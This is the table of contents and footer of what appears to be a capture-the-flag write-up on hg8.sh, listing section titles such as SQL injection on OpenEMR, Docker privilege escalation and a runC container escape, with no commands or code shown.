      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ash-credentials"><span class="toc-number">1.2.</span> <span class="toc-text">Ash credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HMS-Hospital-Management-System"><span class="toc-number">1.3.</span> <span class="toc-text">HMS (Hospital Management System)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-on-OpenEMR"><span class="toc-number">1.4.</span> <span class="toc-text">SQL Injection on OpenEMR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-hash-bruteforce"><span class="toc-number">1.5.</span> <span class="toc-text">Admin hash bruteforce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenEMR-Authenticated-Remote-Code-Execution"><span class="toc-number">1.6.</span> <span class="toc-text">OpenEMR Authenticated Remote Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-ash"><span class="toc-number">1.7.</span> <span class="toc-text">Pivot www-data -&gt; ash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memcached-enumeration"><span class="toc-number">2.2.</span> <span class="toc-text">Memcached enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-ash-gt-luffy"><span class="toc-number">2.3.</span> <span class="toc-text">Pivot ash -&gt; luffy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Privilege-Escalation"><span class="toc-number">2.4.</span> <span class="toc-text">Docker Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9CIntended%E2%80%9D-way-to-root"><span class="toc-number">3.</span> <span class="toc-text">“Intended” way to root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-container-escape-via-runC-CVE-2019-5736"><span class="toc-number">3.1.</span> <span class="toc-text">Docker container escape via runC (CVE-2019-5736)</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
